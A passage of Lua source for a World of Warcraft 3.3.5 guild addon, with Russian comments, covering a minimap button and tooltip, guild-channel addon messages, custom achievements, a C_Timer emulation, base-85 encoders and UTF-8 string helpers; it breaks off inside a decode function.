    local TOOLTIP_COLOR_NSQC3 = "|cFF6495EDNSQC3|cFF808080-"
    local TOOLTIP_COLOR_VERSION = "|cff00BFFF"
    local TOOLTIP_COLOR_MEMORY = " |cffbbbbbbОЗУ: |cff00BFFF"
    local TOOLTIP_COLOR_KB = " |cffbbbbbbкб"
    local TOOLTIP_COLOR_LATEST_VERSION = "|cFF6495EDАктуальная версия аддона: "
    local TOOLTIP_COLOR_UNKNOWN_VERSION = "|cFF6495EDАктуальная версия: |cffff0000Неизвестно"
    local TOOLTIP_COLOR_AVERAGE_ILVL = "|cFF6495EDСредний уровень предметов: "
    local TOOLTIP_COLOR_GEARSORE = "|cFF6495EDGearScore: "
    local TOOLTIP_COLOR_LEFT_CLICK = "|cffFF8C00ЛКМ|cffFFFFE0 - открыть аддон"
    local TOOLTIP_COLOR_RIGHT_CLICK = "|cffF4A460ПКМ|cffFFFFE0 - показать настройки"
    local TOOLTIP_COLOR_MIDDLE_CLICK = "|cff32CD32СКМ|cffFFFFE0 - гильдбанк"

    local function CreateTooltip(self)
        SendAddonMessage("NSQC_VERSION_REQUEST", "", "GUILD")  -- Отправляем запрос
        local myNome = GetUnitName("player")

        GameTooltip:SetOwner(self, "ANCHOR_LEFT")
        
        -- Формируем строку информации о версии и памяти
        local versionInfo = TOOLTIP_COLOR_NSQC3 .. TOOLTIP_COLOR_VERSION .. NSQC3_version .. "." .. NSQC3_subversion .. TOOLTIP_COLOR_MEMORY .. string.format("%.0f", GetAddOnMemoryUsage("NSQC3")) .. TOOLTIP_COLOR_KB
        GameTooltip:AddLine(versionInfo)
        
        -- Добавляем информацию о последней версии, если она известна
        if latestVersion then
            GameTooltip:AddLine(TOOLTIP_COLOR_LATEST_VERSION .. TOOLTIP_COLOR_VERSION .. latestVersion .. "." .. latestSubVersion)
        else
            GameTooltip:AddLine(TOOLTIP_COLOR_UNKNOWN_VERSION)
        end
        
        -- Добавляем средний уровень предметов
        local averageIlvl = TOOLTIP_COLOR_AVERAGE_ILVL .. TOOLTIP_COLOR_VERSION .. string.format("%d", CalculateAverageItemLevel(myNome))
        GameTooltip:AddLine(averageIlvl)
        
        -- Добавляем GearScore, если данные доступны
        if GS_Data and GS_Data[GetRealmName()] and GS_Data[GetRealmName()].Players[myNome] then
            local gearScore = TOOLTIP_COLOR_GEARSORE .. TOOLTIP_COLOR_VERSION .. string.format("%d", GS_Data[GetRealmName()].Players[myNome].GearScore)
            GameTooltip:AddLine(gearScore)
        end
        
        GameTooltip:AddLine(" ")
        GameTooltip:AddLine(TOOLTIP_COLOR_LEFT_CLICK)
        GameTooltip:AddLine(TOOLTIP_COLOR_RIGHT_CLICK)
        GameTooltip:AddLine(TOOLTIP_COLOR_MIDDLE_CLICK)
        GameTooltip:Show()
    end

    -- Добавляем обработчики для тултипа
    miniMapButton:SetScript("OnEnter", function(self)
        CreateTooltip(self)
    end)

    miniMapButton:SetScript("OnLeave", function(self)
        GameTooltip:Hide()
    end)

    -- ВАЖНО: Регистрируем все кнопки мыши для WoW 3.3.5
    miniMapButton:RegisterForClicks("LeftButtonUp", "RightButtonUp", "MiddleButtonUp")

    -- Обработчик кликов с поддержкой всех кнопок мыши
    miniMapButton:SetScript("OnClick", function(self, button)
        if button == "LeftButton" then
            -- Левая кнопка - открыть аддон
            if FriendsFrame:IsVisible() then
                FriendsFrameCloseButton:Click()
            end
            sendAch("Великий открыватор", -1)
            mFldName = GetUnitName("player")
            SendAddonMessage("getFld " .. mFldName, "", "guild")
        elseif button == "RightButton" then
            -- Правая кнопка - показать настройки (если есть функция)
            if NSQC3_ShowSettings then
                NSQC3_ShowSettings()
            end
        elseif button == "MiddleButton" then
            -- Колесо мыши - открыть гильдбанк NSAuk
            if NSAukGuildBankInstance_A then
                if NSAukGuildBankInstance_A.Show then
                    NSAukGuildBankInstance_A:Show()
                else
                    print("|cFFFF0000[NSAuk] Ошибка: метод Show() не найден|r")
                end
            else
                print("|cFFFF0000[NSAuk] Ошибка: экземпляр гильдбанка не создан|r")
            end
        end
    end)

    -- Инициализация таблицы для сохранения позиции
    local position = {
        angle = 0,  -- Угол по умолчанию
        radius = 80  -- Радиус окружности вокруг миникарты
    }

    -- Загрузка сохраненной позиции (если есть)
    if NSQC_SavedData and NSQC_SavedData.angle then
        position.angle = NSQC_SavedData.angle
        position.radius = NSQC_SavedData.radius
    end

    -- Функция для обновления позиции иконки
    local function UpdateMapBtn()
        local cursorX, cursorY = GetCursorPosition()
        local minimapX, minimapY = Minimap:GetCenter()
        local scale = Minimap:GetEffectiveScale()

        -- Вычисляем координаты курсора относительно центра миникарты
        local relativeX = (cursorX / scale) - minimapX
        local relativeY = (cursorY / scale) - minimapY

        -- Вычисляем угол относительно центра миникарты
        position.angle = math.atan2(relativeY, relativeX)

        -- Устанавливаем новую позицию иконки
        miniMapButton:ClearAllPoints()
        miniMapButton:SetPoint(
            "CENTER",
            Minimap,
            "CENTER",
            position.radius * math.cos(position.angle),
            position.radius * math.sin(position.angle)
        )
    end

    -- Обработчик начала перемещения
    miniMapButton:RegisterForDrag("LeftButton")
    miniMapButton:SetScript("OnDragStart", function()
        miniMapButton:SetScript("OnUpdate", UpdateMapBtn)
        miniMapButton:SetAlpha(0.5)  -- Устанавливаем полупрозрачность
    end)

    -- Обработчик завершения перемещения
    miniMapButton:SetScript("OnDragStop", function()
        miniMapButton:SetScript("OnUpdate", nil)
        miniMapButton:SetAlpha(1)  -- Возвращаем непрозрачность

        -- Сохраняем позицию в базу данных
        ns_dbc:modKey("настройки", "minibtn_x", position.radius * math.cos(position.angle))
        ns_dbc:modKey("настройки", "minibtn_y", position.radius * math.sin(position.angle))
    end)

    -- Восстановление позиции иконки после перезагрузки
    local function SetInitialPosition()
        local savedX = ns_dbc:getKey("настройки", "minibtn_x") or 0
        local savedY = ns_dbc:getKey("настройки", "minibtn_y") or 0
        -- Загружаем сохранённые координаты

        if savedX and savedY then
            -- Если координаты существуют, устанавливаем кнопку в сохранённую позицию
            miniMapButton:ClearAllPoints()
            miniMapButton:SetPoint("CENTER", Minimap, "CENTER", savedX, savedY)
        else
            -- Иначе используем стандартную позицию
            miniMapButton:ClearAllPoints()
            miniMapButton:SetPoint(
                "CENTER",
                Minimap,
                "CENTER",
                position.radius * math.cos(position.angle),
                position.radius * math.sin(position.angle)
            )
        end
    end

    SetInitialPosition()  -- Устанавливаем начальную позицию
end

function IsGuildLeader()
    local playerName = UnitName("player")  -- Получаем имя игрока
    for i = 1, GetNumGuildMembers() do     -- Проходим по всем членам гильдии
        local name, _, rankIndex = GetGuildRosterInfo(i)
        if name == playerName then         -- Если имя совпадает с именем игрока
            return rankIndex == 0          -- Проверяем, является ли игрок лидером (ранг 0)
        end
    end
    return false  -- Если игрок не лидер гильдии
end

function createFld()
    -- Создаем адаптивный фрейм
    adaptiveFrame = AdaptiveFrame:new(UIParent)
    adaptiveFrame:AddButtons(100, 10, adaptiveFrame:GetSize()/10, nil, nil)
    -- local panel = {}
    -- for i = 1, 100 do
    --     -- Функция-триггер, которая проверяет параметры кнопки
    --     local trigger1 = function(parentButton)
    --         local texture = parentButton:GetNormalTexture():GetTexture()
    --         if texture == "Interface\\AddOns\\NSQC3\\libs\\00t" then
    --             return true, {
    --                 {texture = "Interface\\Icons\\Spell_Nature_Thorns", func = function() print("Действие 1") end},
    --                 {texture = "Interface\\Icons\\Spell_Nature_HealingTouch", func = function() print("Действие 2") end}
    --             }
    --         end
    --         return false
    --     end
    --     -- Триггер 2: Проверка имени
    --     local trigger2 = function(parentButton)
    --         local name = parentButton:GetName()
    --         if name and name:find("1") then
    --             return true, {
    --                 {
    --                     texture = "Interface\\Icons\\Spell_Nature_Regeneration",
    --                     func = function() print("Специальное действие") end,
    --                     tooltip = "Это кнопка Spell_Nature_Regeneration" -- Добавляем текст тултипа
    --                 }
    --             }
    --         end
    --         return false
    --     end
    --     local panel = PopupPanel:Create(50, 50, 6, 0) -- 4 кнопки в ряд
    --     panel:Show(adaptiveFrame.children[i].frame, {trigger1, trigger2})
    -- end

    adaptiveFrame:Hide()
    adaptiveFrame:StartMovementAlphaTracking()

    local movementFrame = CreateFrame("Frame")
        
    adaptiveFrame.movementCheckFrame = CreateFrame("Frame")
    adaptiveFrame.movementCheckFrame:SetScript("OnUpdate", function(self, elapsed)
        if adaptiveFrame.frame:IsVisible() then
            if GetUnitSpeed('player') > 0 then
                if not adaptiveFrame.isTracking then
                    adaptiveFrame:StartMovementAlphaTracking()
                    adaptiveFrame.isTracking = true
                end
            else
                if adaptiveFrame.isTracking then
                    adaptiveFrame.isTracking = false
                end
            end
        end
    end)

    adaptiveFrame:SetPoint(ns_dbc:getKey("настройки", "mfldX") or 150, ns_dbc:getKey("настройки", "mfldY") or 100)
end

function setFrameAchiv()
    -- Создаем объект CustomAchievements:ShowAchievementAlert(id)
    customAchievements = CustomAchievements:new("CustomAchievementsStatic", "nsqc3_ach")
    customAchievements:SyncDynamicData()  -- Синхронизируем динамические данные при создании
    -- Создаем фрейм, если он еще не создан
    if not customAchievements.frame then
        customAchievements:CreateFrame(AchievementFrame)
    end

    -- Навешиваем хук на событие OnShow для AchievementFrame
    AchievementFrame:HookScript("OnShow", function()
        -- Создаем кнопку только один раз
        if not customAchievements.tabCreated then
            customAchievements:CreateNightWatchTab()
            customAchievements.tabCreated = true
        end
        
    end)

    -- Отслеживаем закрытие окна достижений
    AchievementFrame:HookScript("OnHide", function()
        customAchievements:HideAchievements()  -- Скрываем ачивки при закрытии окна
    end)

    -- Отслеживаем переключение вкладок
    local function OnTabChanged()
        local selectedTab = PanelTemplates_GetSelectedTab(AchievementFrame)
        if selectedTab ~= 3 then
            customAchievements:HideAchievements()  -- Скрываем ачивки при переключении на другие вкладки
        end
    end

    -- Хук на клик по вкладкам
    for i = 1, 2 do
        local tab = _G["AchievementFrameTab" .. i]
        if tab then
            tab:HookScript("OnClick", OnTabChanged)
        end
    end
    customAchievements:UpdateUI()
end

-- ============================================================================
-- collectgarbage("collect") Emulation — FULLY BACKWARDS COMPATIBLE for WoW 3.3.5
-- + SAFE FULL CLEANUP via C_Timer._PurgeAllTimers()
-- ============================================================================

-- Эмуляция C_Timer для WoW 3.3.5
if not C_Timer then
    C_Timer = {}
    
    -- Внутренние переменные для управления таймерами
    local timers = {}
    local timerFrame = CreateFrame("Frame") 
    local timerCount = 0
    
    -- Главный обработчик OnUpdate для всех таймеров
    timerFrame:SetScript("OnUpdate", function(self, elapsed)
        local currentTime = GetTime()
        local timersToRemove = {}
        
        -- Проверяем все активные таймеры
        for id, timer in pairs(timers) do
            timer.elapsed = timer.elapsed + elapsed
            
            -- Если время вышло для однократного таймера
            if not timer.repeating and timer.elapsed >= timer.delay then
                if timer.callback then
                    pcall(timer.callback)
                end
                timersToRemove[id] = true
            end
            
            -- Если время вышло для повторяющегося таймера
            if timer.repeating and timer.elapsed >= timer.delay then
                if timer.callback then
                    pcall(timer.callback)
                end
                timer.elapsed = timer.elapsed - timer.delay
            end
        end
        
        -- Удаляем завершенные таймеры
        for id in pairs(timersToRemove) do
            timers[id] = nil
        end
        
        -- Скрываем фрейм если нет активных таймеров
        if next(timers) == nil then
            self:Hide()
        end
    end)
    
    -- Скрываем фрейм по умолчанию
    timerFrame:Hide()
    
    -- Эмуляция C_Timer.After(delay, callback)
    function C_Timer.After(delay, callback)
        if type(delay) ~= "number" or delay <= 0 then
            error("C_Timer.After: delay must be a positive number", 2)
        end
        
        if type(callback) ~= "function" then
            error("C_Timer.After: callback must be a function", 2)
        end
        
        timerCount = timerCount + 1
        local timerId = timerCount
        
        timers[timerId] = {
            delay = delay,
            elapsed = 0,
            callback = callback,
            repeating = false
        }
        
        -- Показываем фрейм для обработки таймеров
        timerFrame:Show()
    end
    
    -- Эмуляция C_Timer.NewTimer(delay, callback)
    function C_Timer.NewTimer(delay, callback)
        if type(delay) ~= "number" or delay <= 0 then
            error("C_Timer.NewTimer: delay must be a positive number", 2)
        end
        
        if type(callback) ~= "function" then
            error("C_Timer.NewTimer: callback must be a function", 2)
        end
        
        timerCount = timerCount + 1
        local timerId = timerCount
        
        local timer = {
            delay = delay,
            elapsed = 0,
            callback = callback,
            repeating = false
        }
        
        timers[timerId] = timer
        
        -- Показываем фрейм для обработки таймеров
        timerFrame:Show()
        
        -- Создаем объект таймера с методом Cancel
        local timerObject = {
            id = timerId,
            Cancel = function(self)
                if timers[self.id] then
                    timers[self.id] = nil
                    -- Скрываем фрейм если нет активных таймеров
                    if next(timers) == nil then
                        timerFrame:Hide()
                    end
                end
            end
        }
        
        return timerObject
    end
    
    -- Эмуляция C_Timer.NewTicker(interval, callback)
    function C_Timer.NewTicker(interval, callback)
        if type(interval) ~= "number" or interval <= 0 then
            error("C_Timer.NewTicker: interval must be a positive number", 2)
        end
        
        if type(callback) ~= "function" then
            error("C_Timer.NewTicker: callback must be a function", 2)
        end
        
        timerCount = timerCount + 1
        local timerId = timerCount
        
        local timer = {
            delay = interval,
            elapsed = 0,
            callback = callback,
            repeating = true
        }
        
        timers[timerId] = timer
        
        -- Показываем фрейм для обработки таймеров
        timerFrame:Show()
        
        -- Создаем объект тикера с методом Cancel
        local tickerObject = {
            id = timerId,
            Cancel = function(self)
                if timers[self.id] then
                    timers[self.id] = nil
                    -- Скрываем фрейм если нет активных таймеров
                    if next(timers) == nil then
                        timerFrame:Hide()
                    end
                end
            end
        }
        
        return tickerObject
    end
end

function sendAch(name, arg, re)
    if AchievementFrame then
        if UnitLevel("player") >= 10 then
            if not re then
                if customAchievements:GetAchievementData(name)['dateEarned'] == "Не получена" then
                    SendAddonMessage("NSQC3_ach " .. arg, name, "guild")
                end
            else
                SendAddonMessage("NSQC3_ach " .. arg, name, "guild")
            end
        end
    end
end

local set = true

-- Фрейм-таймер создаётся один раз за пределами функции и переиспользуется
local delayTimerFrame = CreateFrame("Frame")
delayTimerFrame:Hide()

function fBtnClick(id, obj)
    if not set then return end
    set = false

    local actionPrefix = ({
        LeftButton = "NSQC3_clcl ",
        RightButton = "NSQC3_clcr "
    })[arg1]

    if actionPrefix and arg2 then
        PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\" .. obj .. ".ogg")
        SendAddonMessage(actionPrefix .. mFldName .. " " .. id, obj, "guild")
    end

    -- Инициализация таймера на 0.3 секунды
    delayTimerFrame.elapsed = 0
    delayTimerFrame:SetScript("OnUpdate", function(self, elapsed)
        self.elapsed = self.elapsed + elapsed
        
        if self.elapsed >= 0.3 then
            set = true
            -- Останавливаем выполнение скрипта и скрываем фрейм
            -- Это аналог "удаления" в рамках ограничений движка WoW 3.3.5
            self:SetScript("OnUpdate", nil)
            self:Hide()
        end
    end)
    
    -- Запуск таймера (OnUpdate срабатывает только у видимых фреймов)
    delayTimerFrame:Show()
end

function ns_crtH(id, obj, craft)
    if craft then
        SendAddonMessage("ns_craft " .. mFldName, obj .. " " .. id .. " " .. adaptiveFrame:GetCurrentLocation(), "GUILD")
    else
        SendAddonMessage("ns_crtH " .. mFldName, obj .. " " .. id, "GUILD")
    end
end

function fBtnEnter(id, obj)
    if adaptiveFrame:GetCurrentLocation() == "участок" then
        -- Проверка наличия модификатора для текущей текстуры
        local textureKey = adaptiveFrame:getTexture(id)
        if not mFldObj:getKey(textureKey).mod then 
            return 
        end

        -- Логика управления флагом
        local currentFlag = mFld:getArg("onEnterFlag")
        local shouldSendRequest = false
        
        -- Обновляем флаг только при изменении объекта
        if currentFlag ~= obj then
            mFld:setArg("onEnterFlag", obj)
            shouldSendRequest = true
        end

        -- Отправка запроса при необходимости
        if shouldSendRequest then
            local activeCount = 0
            for i = 1, 100 do
                if adaptiveFrame:getTexture(id) == adaptiveFrame:getTexture(i) then
                    activeCount = activeCount + 1
                end
            end
            SendAddonMessage((activeCount <= 50 and "nsGetObj1 " or "nsGetObj2 ") .. mFldName, obj, "guild")
        end
    end
end

function getPoint()
    SendAddonMessage("getPoint","", "guild")
end

function gPoint(name)
    local gPointList = mFld:getArg("gPoint")
    if not gPointList then
        return 0
    end
    
    for i = 1, #gPointList do
        if name == gPointList[i] then
            return 1
        end
    end
    
    return nil -- или return 0, если нужно явное отсутствие прав
end

function isMod(obj)
    return ns_tooltips[obj].mod
end

-- Локализация системных функций
local abs, floor = math.abs, math.floor
local byte, sub, char = string.byte, string.sub, string.char
local tbl_insert, tbl_concat, error = table.insert, table.concat, error

local _convertTable3 = {
    [0] = "0", [1] = "1", [2] = "2", [3] = "3", [4] = "4",
    [5] = "5", [6] = "6", [7] = "7", [8] = "8", [9] = "9",
    [10] = "A", [11] = "B", [12] = "C", [13] = "D", [14] = "E",
    [15] = "F", [16] = "G", [17] = "#", [18] = "$", [19] = "%",
    [20] = "(", [21] = ")", [22] = "*", [23] = "+", [24] = "-",
    [25] = "/", [26] = ";", [27] = "<", [28] = "=", [29] = ">",
    [30] = "@", [31] = "H", [32] = "I", [33] = "J", [34] = "K",
    [35] = "L", [36] = "M", [37] = "N", [38] = "O", [39] = "P",
    [40] = "Q", [41] = "R", [42] = "S", [43] = "T", [44] = "U",
    [45] = "V", [46] = "W", [47] = "X", [48] = "Y", [49] = "Z",
    [50] = "^", [51] = "_", [52] = "`", [53] = "a", [54] = "b",
    [55] = "c", [56] = "d", [57] = "e", [58] = "f", [59] = "g",
    [60] = "h", [61] = "i", [62] = "j", [63] = "k", [64] = "l",
    [65] = "m", [66] = "n", [67] = "o", [68] = "p", [69] = "q",
    [70] = "r", [71] = "s", [72] = "t", [73] = "u", [74] = "v",
    [75] = "w", [76] = "x", [77] = "y", [78] = "z", [79] = "{",
    [80] = "|", [81] = "}", [82] = "[", [83] = "]", [84] = "'",
}
-- Обратная таблица конвертации
local _reverseConvertTable3 = {}
for k, v in pairs(_convertTable3) do
    _reverseConvertTable3[v] = k
end
-- Максимальное поддерживаемое число (85^12)
local MAX_NUMBER = 85^12
-- Буфер для кодирования
local encode_buffer = {}
-- Кодирование числа в строку
function en85(dec)
    if type(dec) ~= "number" then error("Input must be a number") end
    if dec == 0 then return "0" end
    -- Проверка диапазона
    if dec < 0 or dec > MAX_NUMBER then
        error("Number out of range: " .. tostring(dec))
    end
    local idx = 0
    repeat
        local remainder = dec % 85
        dec = floor(dec / 85)
        idx = idx + 1
        encode_buffer[idx] = _convertTable3[remainder]
    until dec == 0
    local result = ""
    for i = idx, 1, -1 do
        result = result .. (encode_buffer[i] or "")
    end
    -- Очистка буфера
    for i = 1, idx do
        encode_buffer[i] = nil
    end
    return result
end
-- Декодирование строки в число
function en10(encoded)
    if type(encoded) ~= "string" then return 0 end
    if encoded == "0" then return 0 end
    local number = 0
    local len = #encoded
    for i = 1, len do
        local symbol = sub(encoded, i, i)
        local digit = _reverseConvertTable3[symbol] or 0
        number = number * 85 + digit
    end
    return number
end

local utf8_pattern = "[\1-\127\194-\244][\128-\191]*"
function utf8myLen(s)
    return select(2, s:gsub(utf8_pattern, ""))
end

local strbyte, strlen, strsub = string.byte, string.len, string.sub

local function utf8charbytes(s, i)
    local c = strbyte(s, i)
    if c > 0 and c <= 127 then
        return 1
    elseif c >= 194 and c <= 223 then
        return 2
    elseif c >= 224 and c <= 239 then
        return 3
    elseif c >= 240 and c <= 244 then
        return 4
    else
        error("Invalid UTF-8 character at position " .. i)
    end
end

function utf8mySub(s, i, j)
    if type(s) ~= "string" then
        print("DEBUG: utf8sub arg #1 = " .. tostring(s) .. " (" .. type(s) .. ")")
        error("bad argument #1 to 'utf8sub' (string expected)")
    end
    if type(i) ~= "number" or (j ~= nil and type(j) ~= "number") then
        print("DEBUG: utf8sub arg #2 = " .. tostring(i) .. " (" .. type(i) .. ")")
        print("DEBUG: utf8sub arg #3 = " .. tostring(j) .. " (" .. type(j) .. ")")
        error("bad arguments #2 and/or #3 to 'utf8sub' (numbers expected)")
    end
    if j == nil then
        j = -1
    end

    local bytes = strlen(s)
    local startChar, endChar = i, j
    local charPositions

    if i < 0 or j < 0 then
        charPositions = {}
        local len = 0
        local pos = 1
        while pos <= bytes do
            local charBytes = utf8charbytes(s, pos)
            len = len + 1
            charPositions[len] = pos
            pos = pos + charBytes
        end
        startChar = (i < 0) and (len + i + 1) or i
        endChar = (j < 0) and (len + j + 1) or j
        endChar = math.min(endChar, len)
        startChar = math.max(startChar, 1)
    end

    if startChar > endChar then
        return ""
    end

    local startByte, endByte
    if charPositions then
        startByte = charPositions[startChar]
        local endPos = charPositions[endChar]
        endByte = endPos + utf8charbytes(s, endPos) - 1
    else
        local currentChar = 0
        local pos = 1
        while pos <= bytes do
            local charBytes = utf8charbytes(s, pos)
            currentChar = currentChar + 1
            if currentChar == startChar then
                startByte = pos
            end
            if currentChar == endChar then
                endByte = pos + charBytes - 1
                break
            end
            pos = pos + charBytes
        end
    end

    return strsub(s, startByte, endByte)
end

GuildMemberDetailFrame:HookScript("OnUpdate", function(self, elapsed)
    if GuildMemberDetailFrame:IsVisible() then
        local selectedName = GuildFrame.selectedName
        if selectedName and selectedName ~= mFldName then
            mFldName = selectedName -- Обновляем предыдущее значение
            if adaptiveFrame:isVisible() then
                adaptiveFrame:HideAllCellTexts()
                SendAddonMessage("getFld " .. mFldName, "", "guild")
            end
        end
    end
end)

function time100()
    if adaptiveFrame.children[1].frame:IsVisible() then
        SendAddonMessage("time100", 1, "GUILD")
    else
        SendAddonMessage("time100", 0, "GUILD")
    end
end

function setTooltip(obj, text, flag)
    if not obj then return end
    
    -- Проверяем, есть ли у объекта уже установленный обработчик OnEnter
    local existingScript = obj:GetScript("OnEnter")
    
    if flag and existingScript then
        -- Если флаг есть и есть существующий обработчик, создаем обертку
        obj:SetScript("OnEnter", function(self)
            -- Сначала вызываем оригинальный обработчик
            existingScript(self)
            
            -- Затем добавляем наш текст
            GameTooltip:AddLine(text, 1, 1, 1, true)
            GameTooltip:Show()
        end)
    else
        -- Если флага нет или нет существующего обработчика, создаем новый
        obj:SetScript("OnEnter", function(self)
            GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
            GameTooltip:SetText(text)
            GameTooltip:Show()
        end)
        
        -- Стандартный обработчик для скрытия тултипа
        obj:SetScript("OnLeave", function()
            GameTooltip:Hide()
        end)
    end
end

function trim(s)
    return s:match("^%s*(.-)%s*$")
end
string.trim = string.trim or trim

function getInstId()
    local numSaved = GetNumSavedInstances()
    if numSaved > 0 then
        for i = 1, numSaved do
            local name, id, _, _, locked = GetSavedInstanceInfo(i)
            if locked then
                print("Рейд:", name, "| Уникальный ID:", id)
            end
        end
    else
        print("Нет сохранённых рейдов.")
    end
end

local mailTabTracker = CreateFrame("Frame")

local function OnMailTabClicked()
    if PanelTemplates_GetSelectedTab(MailFrame) == 2 then
        SendAddonMessage("ns_shBtnM", "", "guild")
    end
end

for i = 1, 2 do
    local tab = _G["MailFrameTab"..i]
    if tab then
        tab:HookScript("OnClick", OnMailTabClicked)
    end
end

function CreateBonusQuestTurnInButtons()
    if not SendMailFrame or not SendMailFrame:IsShown() then return end
    
    if _G["BonusQuestTurnInMainButton"] then return end
    
    local mainButton = CreateFrame("Button", "BonusQuestTurnInMainButton", SendMailFrame)
    mainButton:SetSize(32, 32)
    mainButton:SetPoint("LEFT", SendMailSubjectEditBox, "RIGHT", 25, 0)
    
    local icon = mainButton:CreateTexture(nil, "BACKGROUND")
    icon:SetTexture("Interface\\GossipFrame\\ActiveQuestIcon")
    icon:SetAllPoints(mainButton)
    
    mainButton:SetHighlightTexture("Interface\\Buttons\\UI-Common-MouseHilight")
    mainButton:GetHighlightTexture():SetBlendMode("ADD")
    
    mainButton:SetScript("OnEnter", function(self)
        GameTooltip:SetOwner(self, "ANCHOR_RIGHT")
        GameTooltip:SetText("Сдать бонусный квест", 1, 1, 1)
        GameTooltip:Show()
    end)
    mainButton:SetScript("OnLeave", function() GameTooltip:Hide() end)
    
    local actionButton = CreateFrame("Button", "BonusQuestTurnInActionButton", SendMailFrame, "UIPanelButtonTemplate")
    actionButton:SetSize(SendMailMailButton:GetWidth(), SendMailMailButton:GetHeight())
    actionButton:SetText("СДАТЬ")
    actionButton:SetPoint("TOPLEFT", SendMailMailButton, "TOPLEFT")
    actionButton:SetNormalTexture("Interface\\Buttons\\UI-Panel-Button-Up")
    actionButton:SetPushedTexture("Interface\\Buttons\\UI-Panel-Button-Down")
    actionButton:SetHighlightTexture("Interface\\Buttons\\UI-Panel-Button-Highlight")
    actionButton:Hide()
    
    mainButton:SetScript("OnClick", function()
        if actionButton:IsShown() then
            actionButton:Hide()
            SendMailMailButton:Show()
            SendMailCancelButton:Show()
        else
            actionButton:Show()
            SendMailMailButton:Hide()
            SendMailCancelButton:Hide()
        end
    end)
    
    actionButton:SetScript("OnClick", function()
        SendAddonMessage("ns_checkBQ", "", "guild")
    end)
    
    -- Очищаем при закрытии почты
    MailFrame:HookScript("OnHide", function()
        actionButton:Hide()
        SendMailMailButton:Show()
        SendMailCancelButton:Show()
    end)
end

-- function SendGuildOfficerMessageWithBonus(message)
--     local msg = mysplit(message)
--     local myName = UnitName("player") -- Получаем имя текущего игрока
    
--     -- Проверяем, что сообщение имеет минимум 3 слова
--     if #msg < 3 then
--         return -- Выходим, если слов недостаточно
--     end
    
--     local bonusMessage = msg[2] -- Второе слово (бонус)
--     -- Собираем оставшуюся часть сообщения начиная с 3-го слова
--     local mainMessage = table.concat(msg, " ", 3)
--     print(mainMessage)
--     for i = 1, GetNumGuildMembers(true) do
--         local name, rankName = GetGuildRosterInfo(i)
--         if name == myName then
--             if rankName == "Лейтенант" or rankName == "Капитан" then
--                 -- Отправляем сообщение в офицерский чат
--                 SendChatMessage(mainMessage .. " плюс " .. bonusMessage, "OFFICER", nil, 1)
--                 -- Отправляем аддон-сообщение
--                 SendAddonMessage("nsGP" .. " " .. bonusMessage, mainMessage, "guild")
--             end
--             break -- Прерываем цикл после нахождения своего игрока
--         end
--     end
-- end











-- Base85 with custom encoding table for WoW 3.3.5 (Lua 5.1)

local Base85 = {}

local encodeTable = {
    [0] = "0", [1] = "1", [2] = "2", [3] = "3", [4] = "4",
    [5] = "5", [6] = "6", [7] = "7", [8] = "8", [9] = "9",
    [10] = "A", [11] = "B", [12] = "C", [13] = "D", [14] = "E",
    [15] = "F", [16] = "G", [17] = "#", [18] = "$", [19] = "%",
    [20] = "(", [21] = ")", [22] = "*", [23] = "+", [24] = "-",
    [25] = "/", [26] = ";", [27] = "<", [28] = "=", [29] = ">",
    [30] = "@", [31] = "H", [32] = "I", [33] = "J", [34] = "K",
    [35] = "L", [36] = "M", [37] = "N", [38] = "O", [39] = "P",
    [40] = "Q", [41] = "R", [42] = "S", [43] = "T", [44] = "U",
    [45] = "V", [46] = "W", [47] = "X", [48] = "Y", [49] = "Z",
    [50] = "^", [51] = "_", [52] = "`", [53] = "a", [54] = "b",
    [55] = "c", [56] = "d", [57] = "e", [58] = "f", [59] = "g",
    [60] = "h", [61] = "i", [62] = "j", [63] = "k", [64] = "l",
    [65] = "m", [66] = "n", [67] = "o", [68] = "p", [69] = "q",
    [70] = "r", [71] = "s", [72] = "t", [73] = "u", [74] = "v",
    [75] = "w", [76] = "x", [77] = "y", [78] = "z", [79] = "{",
    [80] = "|", [81] = "}", [82] = "[", [83] = "]", [84] = "'",
}

-- Decoding table (built dynamically for performance)
local decodeTable = nil

local function BuildDecodeTable()
    decodeTable = {}
    for i=0,84 do
        local c = encodeTable[i]
        decodeTable[c] = i
    end
end

-- Helper function to convert 4 bytes to a 32-bit integer
local function BytesToInt(b1, b2, b3, b4)
    return b1*16777216 + b2*65536 + b3*256 + b4
end

-- Helper function to convert a 32-bit integer to 5 base85 characters\
local frameLayoutCache = {}
local function IntToBase85(num)
    if num == 0 then return encodeTable[0]..encodeTable[0]..encodeTable[0]..encodeTable[0]..encodeTable[0] end
    
    local result = {}
    for i=1,5 do
        local remainder = num % 85
        result[6-i] = encodeTable[remainder]
        num = math.floor(num / 85)
    end
    
    return table.concat(result)
end

-- Encodes a string to Base85
function Base85.Encode(input)
    if not input then return nil end
    if #input == 0 then return "" end
    
    local result = {}
    local padding = 0
    
    -- Process 4 bytes at a time
    for i=1, #input, 4 do
        local b1, b2, b3, b4 = input:byte(i, i+3)
        
        -- Handle padding for the last chunk
        if not b2 then b2 = 0 end
        if not b3 then b3 = 0 end
        if not b4 then b4 = 0; padding = 4 - (#input - i) end
        
        local num = BytesToInt(b1, b2, b3, b4)
        local chunk = IntToBase85(num)
        
        -- Shorten the last chunk if there was padding
        if padding > 0 then
            chunk = chunk:sub(1, 5 - padding)
        end
        
        table.insert(result, chunk)
    end
    
    return table.concat(result)
end

-- Helper function to convert 5 base85 characters to a 32-bit integer
local function Base85ToInt(str)
    if not decodeTable then BuildDecodeTable() end
    
    local num = 0
    for i=1, #str do
        local c = str:sub(i,i)
        local value = decodeTable[c]
        if not value then
            error("Invalid Base85 character: " .. c)
        end
        num = num * 85 + value
    end
    
    -- Handle short chunks (padding)
    for i=#str+1, 5 do
        num = num * 85 + 84
    end
    
    return num
end

-- Helper function to convert a 32-bit integer to 4 bytes
local function IntToBytes(num)
    local b4 = num % 256; num = math.floor(num / 256)
    local b3 = num % 256; num = math.floor(num / 256)
    local b2 = num % 256; num = math.floor(num / 256)
    local b1 = num % 256
    
    return b1, b2, b3, b4
end

-- Decodes a Base85 string
function Base85.Decode(input)
    if not input then return nil end
    if #input == 0 then return "" end
    
    local result = {}
    local padding = 0
    
    -- Process 5 characters at a time
    for i=1, #input, 5 do
        local chunk = input:sub(i, i+4)
        
        -- Handle padding for the last chunk
        if #chunk < 5 then
            padding = 5 - #chunk
            chunk = chunk .. string.rep(encodeTable[84], padding) -- Use the last character for padding
        end
        
        local num = Base85ToInt(chunk)
        local b1, b2, b3, b4 = IntToBytes(num)
        
        -- Remove padding bytes
        if padding > 0 then
